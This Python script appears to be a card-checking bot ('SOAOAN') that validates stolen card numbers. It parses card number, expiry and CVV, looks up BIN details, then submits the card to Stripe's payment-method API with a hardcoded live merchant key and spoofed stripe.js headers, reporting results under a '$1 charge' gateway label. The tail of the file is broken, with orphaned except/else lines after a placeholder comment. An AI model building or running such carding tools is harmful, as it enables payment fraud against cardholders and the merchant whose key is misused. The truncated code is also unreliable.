# s1.py
import aiohttp
import asyncio
import re
import time

async def stripe_1d(text):
    start_time = time.time()
    print("Processing card...")
    pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})' 
    match = re.search(pattern, text)

    if not match:
        return "Invalid card format. Please provide valid card details."

    card_number = match.group(1)
    month = match.group(2)
    year = match.group(3)
    cvv = match.group(4)

    if len(year) == 2:
        year = "20" + year
        
    n = card_number
    cvc = cvv
    mm = month
    yy = year
    full_card = f"{n}|{mm}|{yy}|{cvc}"

    # Get BIN information first
    try:
        url = f'https://bins.antipublic.cc/bins/{n[:6]}'  # Use first 6 digits for BIN
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as bin_response:
                if bin_response.status == 200:
                    z = await bin_response.json()
                    bin_info = z.get('bin', 'N/A')
                    bank = z.get('bank', 'N/A')
                    brand = z.get('brand', 'N/A')
                    card_type = z.get('type', 'N/A')
                    level = z.get('level', 'N/A')
                    country = z.get('country_name', 'N/A')
                    flag = z.get('country_flag', '')
                    currency = z.get('country_currencies', ['N/A'])[0]
                else:
                    # Set default values if BIN lookup fails
                    bin_info, bank, brand, card_type, level, country, flag, currency = (
                        'N/A', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A', '', 'N/A'
                    )
    except Exception as e:
        print(f"BIN lookup error: {str(e)}")
        bin_info, bank, brand, card_type, level, country, flag, currency = (
            'N/A', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A', '', 'N/A'
        )

    # Stripe Payment Method creation
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': 'N/A',
        'muid': 'N/A', 
        'sid': 'N/A',   
        'payment_user_agent': 'stripe.js/v3',
        'key': 'pk_live_51RQV5kGAIBYDmNVzqhTEEAkHL2GCWfuFKhiIyjnr7lKYGG6mgIc4Boj71MPD2dMHPjw7BHcWqw2asYbRMtLylrTo00IyNhMakJ',
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                'https://api.stripe.com/v1/payment_methods', 
                headers=headers, 
                data=data,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as stripe_response:
                stripe_json = await stripe_response.json()
                
                if stripe_response.status != 200:
                    error_msg = stripe_json.get('error', {}).get('message', 'Unknown error')
                    elapsed_time = time.time() - start_time
                    return f"""
▰▱▰▱✬✬ ℝ𝔼𝕊𝕌𝕃𝕋 ✬✬▰▱▰▱

𝗖𝗮𝗿𝗱⇝ {full_card}

𝗚𝗮𝘁𝗲𝘄𝗮𝘆⇝ Stripe 1$ Charge
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲⇝ Stripe Error: {error_msg}

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗗𝗲𝘁𝗮𝗶𝗹𝘀⇝ {card_type} - {level} - {brand}
𝗕𝗮𝗻𝗸⇝ {bank}

𝗖𝗼𝘂𝗻𝘁𝗿𝘆⇝ {country}{flag} - {currency}
𝗧𝗮𝗸𝗲𝗻⇝ {elapsed_time:.2f}s

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗕𝗼𝘁⇝ SOAOAN
                    """
                
                payment_method_id = stripe_json.get('id')
                if not payment_method_id:
                    elapsed_time = time.time() - start_time
                    return f"""
▰▱▰▱✬✬ ℝ𝔼𝕊𝕌𝕃𝕋 ✬✬▰▱▰▱

𝗖𝗮𝗿𝗱⇝ {full_card}

𝗚𝗮𝘁𝗲𝘄𝗮𝘆⇝ Stripe 1$ Charge
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲⇝ No Payment Method ID Received

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗗𝗲𝘁𝗮𝗶𝗹𝘀⇝ {card_type} - {level} - {brand}
𝗕𝗮𝗻𝗸⇝ {bank}

𝗖𝗼𝘂𝗻𝘁𝗿𝘆⇝ {country}{flag} - {currency}
𝗧𝗮𝗸𝗲𝗻⇝ {elapsed_time:.2f}s

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗕𝗼𝘁⇝ SOAOAN
                    """
    except Exception as e:
        elapsed_time = time.time() - start_time
        return f"""
▰▱▰▱✬✬ ℝ𝔼𝕊𝕌𝕃𝕋 ✬✬▰▱▰▱

𝗖𝗮𝗿𝗱⇝ {full_card}

𝗚𝗮𝘁𝗲𝘄𝗮𝘆⇝ Stripe 1$ Charge
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲⇝ Stripe Request Error: {str(e)}

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗗𝗲𝘁𝗮𝗶𝗹𝘀⇝ {card_type} - {level} - {brand}
𝗕𝗮𝗻𝗸⇝ {bank}

𝗖𝗼𝘂𝗻𝘁𝗿𝘆⇝ {country}{flag} - {currency}
𝗧𝗮𝗸𝗲𝗻⇝ {elapsed_time:.2f}s

ᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖᨖ
𝗕𝗼𝘁⇝ SOAOAN
        """

    # Process payment with the obtained payment method ID
    # ... [Rest of your payment processing code remains the same]
        except Exception as e:
            return f"Error processing final request: {str(e)}"
    else:
        return "Invalid card format. Please provide a valid card number, month, year, and cvv."
